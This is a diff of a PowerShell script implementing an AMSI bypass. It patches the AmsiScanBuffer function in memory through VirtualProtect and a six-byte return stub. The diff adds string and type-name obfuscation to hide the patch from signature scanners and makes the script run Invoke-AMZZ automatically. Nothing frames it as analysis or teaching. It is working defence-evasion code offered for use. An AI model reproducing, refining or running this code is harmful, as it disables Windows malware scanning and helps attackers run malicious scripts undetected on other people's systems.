@@ -15,18 +15,18 @@ function get_proc_address {
     return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
 }
 
-
-
 function Invoke-AMZZ {
-    $ppruhu = get_proc_address amsi.dll AmsiScanBuffer
+    $ppruhu = get_proc_address amsi.dll "A@#m@#si@#S@#ca@#nBu@#ff@#e@#r".Replace("@#","")
     $virpro = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((get_proc_address kernel32.dll VirtualProtect),(get_delegate_type (@([System.IntPtr], [System.UIntPtr], [System.UInt32], [System.UInt32].MakeByRefType())) ([System.Boolean])));$p = 0
     $virpro.Invoke($ppruhu, [UInt32]5, 0x40, [ref]$p)
     
     $scnfh = @([Byte] 0xB8, [Byte] 0x57, [Byte] 0x00,[Byte] 0x07, [Byte] 0x80, [Byte] 0xC3)
-    [System.Runtime.InteropServices.Marshal]::Copy($scnfh, 0, $ppruhu, 6)
+    $Ui6SdR=  [type]("{5}{3}{6}{9}{0}{2}{7}{4}{8}{1}" -F 'Ter','hal','o','sTem.R','i','sY','untiMe.i','psERV','ces.mArS','N');  (gI  ('vARI'+'Ab'+'Le'+':ui6s'+'dR')  )."v`AlUE"::("{0}{1}" -f 'Cop','y').Invoke(${s`cn`FH}, 0, ${PPr`Uhu}, 6)
 
 }
 
+
+Invoke-AMZZ
 
 
 
